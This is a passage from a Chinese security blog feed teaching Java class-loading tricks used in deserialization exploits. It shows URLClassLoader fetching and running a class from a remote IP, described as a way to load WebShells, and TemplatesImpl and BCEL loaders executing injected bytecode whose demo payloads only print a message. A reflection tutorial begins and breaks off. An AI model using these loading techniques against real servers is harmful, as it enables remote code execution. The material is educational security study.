punctuation">{</span>           <span class="token keyword">return</span> <span class="token function">defineClass</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> bytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bytes<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">findClass</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="getParent-方法"><a href="#getParent-方法" class="headerlink" title="getParent()方法"></a>getParent()方法</h5><p>返回当前类加载器的父类加载器。</p><h5 id="resolveClass-Class-lt-gt-方法"><a href="#resolveClass-Class-lt-gt-方法" class="headerlink" title="resolveClass(Class&lt;?&gt;)方法"></a>resolveClass(Class&lt;?&gt;)方法</h5><p>链接指定的Java类。</p><h4 id="URLClassLoader类"><a href="#URLClassLoader类" class="headerlink" title="URLClassLoader类"></a>URLClassLoader类</h4><p>URLCIassLoader类是ClassLoader的一个实现，拥有从远程服务器上加载类的能力。通过URLCIassLoader可以实现对一些WebShell的远程加载。</p><p>正常情况下，Java会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这些路径是经过处理后的 java.net.URL 类）来寻找.class文件来加载，而这个基础路径有分为三种情况:</p><ol><li>URL未以斜杠 &#x2F; 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件</li><li>URL以斜杠 &#x2F; 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件</li><li>URL以斜杠 &#x2F; 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类</li></ol><p>以下为测试代码，通过Hello类远程加载Hello1.class。注意这里是包结构，因此Hello1这个类编译需要改名为com.Hello1.class，不然会加载失败。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>Hello<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token keyword">package</span> com<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URLClassLoader<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hello</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        URL<span class="token punctuation">[</span><span class="token punctuation">]</span> urls <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://49.???.???.???/"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        URLClassLoader loader <span class="token operator">=</span> URLClassLoader<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>urls<span class="token punctuation">)</span><span class="token punctuation">;</span>        Class <span class="token class-name">c</span> <span class="token operator">=</span> loader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"com.Hello1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        c<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>Hello1<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token keyword">package</span> com<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hello1</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">Hello1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hacked by Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"I am void main"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>output<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>Hacked by Squirt1e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="TemplatesImpl加载字节码"><a href="#TemplatesImpl加载字节码" class="headerlink" title="TemplatesImpl加载字节码"></a>TemplatesImpl加载字节码</h4><p>由于defineClass()方法的作用域是protected，外部类是无法调用的。因此在访问protected成员变量或方法必须通过setAccessible(true)，因此defineClass是不好直接调用的。</p><p>TemplatesImpl 类中定义了一个内部类TransletClassLoader ，重写了defineClass方法。</p><pre class="line-numbers language-java"><code class="language-java">        <span class="token comment" spellcheck="true">/**         * Access to final protected superclass member from outer class.         */</span>        Class <span class="token class-name">defineClass</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">defineClass</span><span class="token punctuation">(</span>null<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> b<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有声明修饰符就默认为default，可以从外部类访问。</p><p>调用链：</p><pre class="line-numbers language-java"><code class="language-java">TemplatesImpl#<span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>TemplatesImpl#<span class="token function">getTransletInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>TemplatesImpl#<span class="token function">defineTransletClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>TransletClassLoader#<span class="token function">defineClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>newTransformer方法是public可以直接调用，因此P牛的poc(去GitHub下个ysoserial)。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TemplatesImpl<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TransformerFactoryImpl<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Base64<span class="token punctuation">;</span><span class="token keyword">import</span> ysoserial<span class="token punctuation">.</span>payloads<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Reflections<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TemplateExp</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// source: bytecodes/HelloTemplateImpl.java</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        TemplatesImpl obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Reflections<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>code<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Reflections<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"HelloTemplatesImpl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Reflections<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一大串字符是base64编码后的字节码，注意：字节码对应的类必须是 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 的子类。</p><p>接着我们要通过setFieldValue设置私有变量，_bytecodes为交给JVM的字节码，__name不为null就可以，这是因为👇</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">private</span> Translet <span class="token function">getTransletInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">throws</span> TransformerConfigurationException <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>_name <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> null<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>_class <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token function">defineTransletClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment" spellcheck="true">//略</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设置_tfactory是因为defineTransletClasses方法调用了TransformerFactoryImpl类中的getExternalExtensionsMap方法。</p><h4 id="BCEL-ClassLoader加载字节码"><a href="#BCEL-ClassLoader加载字节码" class="headerlink" title="BCEL ClassLoader加载字节码"></a>BCEL ClassLoader加载字节码</h4><p>BCEL是专门用来操控class字节码文件的类，jdk8u251后移除了BCEL的ClassLoader类，之前的版本可以利用。 Repository 用于将一个Java class转换为原生字节码，也可以直接使用javac命令来编译java文件生成字节码；Utility 将</p><p>原生的字节码转换成BCEL格式的字节码，注意Utility.encode生成的BCEL字节码要加上$$BCEL$$的前缀。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InvocationTargetException<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>Repository<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>classfile<span class="token punctuation">.</span>JavaClass<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ClassLoader<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>classfile<span class="token punctuation">.</span>Utility<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloBCEL</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String <span class="token punctuation">[</span><span class="token punctuation">]</span>args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        JavaClass cls <span class="token operator">=</span> Repository<span class="token punctuation">.</span><span class="token function">lookupClass</span><span class="token punctuation">(</span>com<span class="token punctuation">.</span>Hello1<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String code <span class="token operator">=</span> Utility<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>cls<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> ClassNotFoundException<span class="token punctuation">,</span> InstantiationException<span class="token punctuation">,</span> IllegalAccessException<span class="token punctuation">,</span> NoSuchMethodException<span class="token punctuation">,</span> InvocationTargetException <span class="token punctuation">{</span>        <span class="token keyword">new</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQMO$c2$40$Q$7d$x$95$d2R$BA$f0$5b$8bz$40$P$S$S$T$P$Y$3d$98$YL$88$9a$60$b8xZ$ca$G$X$fb$a1$a5$90$f0$b3$f4$a0$89$H$7f$80$3f$ca8$5bH$I$Jm2$d3$f7v$e6$cd$9b$ed$ef$df$f7$P$803$i$99$d0Q4P$c2z$K$h$s6$b1$95$c2$b6$8e$j$j$bb$M$c9$L$e9$cb$e8$92$nQ9n3h$d7AW0d$9b$d2$XwC$af$p$c2G$deq$89$c97$D$87$bbm$kJ$85$a7$a4$W$3d$cb$B$83$d5t$C$af$da$Q$ae$h$d4$ea$c4z$5c$fa$M$a5$caS$b3$cfG$bc$ear$bfWmE$a1$f4$7b$f5x$G$P$7b$d4UXp$cc$60$b6$82a$e8$88$h$a9$f4$d3$T$cdSUg$n$FC$c7$9e$85$7d$d8$e4$a7$c1$9d$X$d1$b5$3bc$bb$f56$94aT$T$3a$ca$W$Op$c8$90$b9$b5$b9g$8f$C$d9$b5$t$5e$cc$99A$86$dcl$ec$7d$a7$_$9ch$8ej$8d$H$91$f0$e8$3e$82$n$j$U$t$keP$7d$m$83$R$d9$U$dc$p$9b$85$F4$83$fe$aa$90K$D$8b$95E$bb$a3$8c$q$fd$M$f5$y$81$a9$85$u$9a$84$aeb$M$ac$9c$7c$81$7d$60$v$9f$f8$84$f6$k$97$a5$vf$90$a0$98$84F$cd$ea$k$yB$d6$a4$81$de$Me$DY$e4$a6b$e7S1C$J$z$cf$J$99$94A_Jb$sb$60$Vy$ca$b4V$5c$b9$f6$P$v$c2$l$b2$3c$C$A$A"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>output<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>$l$8b$I$A$A$A$A$A$A$AmQMO$c2$<span class="token number">40</span>$Q$<span class="token number">7d</span>$x$<span class="token number">95</span>$d2R$BA$f0$5b$8bz$<span class="token number">40</span>$P$S$S$T$P$Y<span class="token comment" spellcheck="true">//略</span>Hacked by Squirt1e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注：BCEL格式的字节码就是把原生字节码进行HEX编码，再把反斜线替换成$。</p>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全基础 </tag>
            
            <tag> 类加载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计基础—反射</title>
      <link href="/2021/11/15/java-dai-ma-shen-ji-ji-chu-fan-she/"/>
      <url>/2021/11/15/java-dai-ma-shen-ji-ji-chu-fan-she/</url>
      
        <content type="html"><![CDATA[<blockquote><p>反射是Java的一个重要特性，通过反射可以调用程序运行时任意类、对象的方法，也能访问或修改变量的值，并且能判断对象所属的类。</p></blockquote><h4 id="实例化"><a href="#实例化" class="headerlink" title="实例化"></a>实例化</h4><p>弄明白反射还是要稍微深入了解实例化的过程，下面有个样例，取自代码审计星球反射系列下ir0ny师傅的评论。</p><p>Person p &#x3D; new Person(“zhangsan”,20); 实例化Person类，这句话做了什么？ </p><ol><li>因为new用到了Person.class.所以会先找到Person.class文件并加载到内存中。</li><li>执行该类中的static代码块，如果有的话，给Person.class类进行初始化。</li><li>在堆内存中开辟空间，分配内存地址。</li><li>在堆内存中建立对象的特有属性。并进行默认初始化。 </li><li>对属性进行显示初始化。</li><li>对对象进行构造代码块初始化。</li><li>对对象进行对应的构造函数初始化。</li><li>将内存地址付给栈内存中的p变量。</li></ol><p>实例化TrainPrint，下面的代码将输出什么？getClass以及class就先理解为java文件编译后的class文件好了，代码改自Java安全漫谈。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TrainPrint</span> <span class="token punctuation">{</span>    <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Empty block initial %s\n"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Static initial %s\n"</span><span class="token punctuation">,</span> TrainPrint<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">fuck</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token function">TrainPrint</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Initial %s\n"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">fuck</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>        TrainPrint trainPrint<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TrainPrint</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>output<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>Static initial <span class="token keyword">class</span> <span class="token class-name">com<span class="token punctuation">.</span>ms08067<span class="token punctuation">.</span>TrainPrint</span>Empty block initial <span class="token keyword">class</span> <span class="token class-name">com<span class="token punctuation">.</span>ms08067<span class="token punctuation">.</span>TrainPrint</span>Initial <span class="token keyword">class</span> <span class="token class-name">com<span class="token punctuation">.</span>ms08067<span class="token punctuation">.</span>TrainPrint</span>com<span class="token punctuation">.</span>ms08067<span class="token punctuation">.</span>TrainPrint<span class="token annotation punctuation">@4b67cf4d</span><span aria-hidden="true" 